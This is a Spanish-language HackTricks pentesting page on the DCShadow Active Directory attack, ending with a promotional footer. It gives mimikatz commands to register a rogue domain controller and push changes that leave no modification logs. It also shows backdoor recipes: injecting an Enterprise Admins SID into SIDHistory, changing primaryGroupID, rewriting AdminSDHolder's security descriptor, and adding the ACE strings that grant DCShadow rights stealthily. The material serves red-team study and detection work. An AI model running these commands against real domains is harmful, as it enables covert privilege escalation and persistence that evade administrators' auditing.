# DCShadow

Registra un **nuevo controlador de dominio** en AD y lo utiliza para **insertar atributos** (SIDHistory, SPNs...) en objetos especificados **sin** dejar ningún **registro** de las **modificaciones**. Se necesitan privilegios de DA y estar dentro del **dominio raíz**.\
Ten en cuenta que si utilizas datos incorrectos, aparecerán registros bastante feos.

Para llevar a cabo el ataque se necesitan 2 instancias de mimikatz. Una de ellas iniciará los servidores RPC con privilegios de SYSTEM (aquí se indicarán los cambios que se quieren realizar), y la otra instancia se utilizará para insertar los valores:

{% code title="mimikatz1 (servidores RPC)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% code title="mimikatz2 (push) - Necesita DA o similar" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Ten en cuenta que **`elevate::token`** no funcionará en la sesión de mimikatz1 ya que eleva los privilegios del hilo, pero necesitamos elevar los **privilegios del proceso**.\
También puedes seleccionar un objeto "LDAP": `/object:CN=Administrador,CN=Usuarios,DC=JEFFLAB,DC=local`

Puedes realizar los cambios desde una cuenta DA o desde una cuenta de usuario con estos permisos mínimos:

* En el objeto **dominio**:
  * _DS-Install-Replica_ (Agregar/Quitar réplica en el dominio)
  * _DS-Replication-Manage-Topology_ (Administrar topología de replicación)
  * _DS-Replication-Synchronize_ (Sincronización de replicación)
* El objeto **Sitios** (y sus hijos) en el contenedor **Configuración**:
  * _CreateChild y DeleteChild_
* El objeto del **equipo que está registrado como DC**:
  * _WriteProperty_ (No Write)
* El **objeto de destino**:
  * _WriteProperty_ (No Write)

Puedes utilizar [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) para otorgar estos permisos a un usuario sin privilegios (ten en cuenta que esto dejará algunos registros). Esto es mucho más restrictivo que tener privilegios DA.\
Por ejemplo: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Esto significa que el nombre de usuario _**student1**_ cuando inicie sesión en la máquina _**mcorp-student1**_ tendrá permisos DCShadow sobre el objeto _**root1user**_.

## Usando DCShadow para crear puertas traseras

{% code title="Establecer Enterprise Admins en SIDHistory a un usuario" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519 
```
{% code title="Cambiar el ID de grupo principal (poner al usuario como miembro de Administradores de Dominio)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% code title="Modificar ntSecurityDescriptor de AdminSDHolder (dar control total a un usuario)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
## Shadowception - Dar permisos a DCShadow usando DCShadow (sin registros de permisos modificados)

Necesitamos agregar los siguientes ACEs con el SID de nuestro usuario al final:

* En el objeto de dominio:
  * `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;SIDdelUsuario)`
  * `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;SIDdelUsuario)`
  * `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;SIDdelUsuario)`
* En el objeto del equipo atacante: `(A;;WP;;;SIDdelUsuario)`
* En el objeto de usuario objetivo: `(A;;WP;;;SIDdelUsuario)`
* En el objeto de Sitios en el contenedor de Configuración: `(A;CI;CCDC;;;SIDdelUsuario)`

Para obtener el ACE actual de un objeto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Tenga en cuenta que en este caso necesita hacer **varios cambios**, no solo uno. Entonces, en la sesión **mimikatz1** (servidor RPC), use el parámetro **`/stack` con cada cambio** que desee realizar. De esta manera, solo necesitará **`/push`** una vez para realizar todos los cambios acumulados en el servidor malicioso.

[**Más información sobre DCShadow en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.

- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live).

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
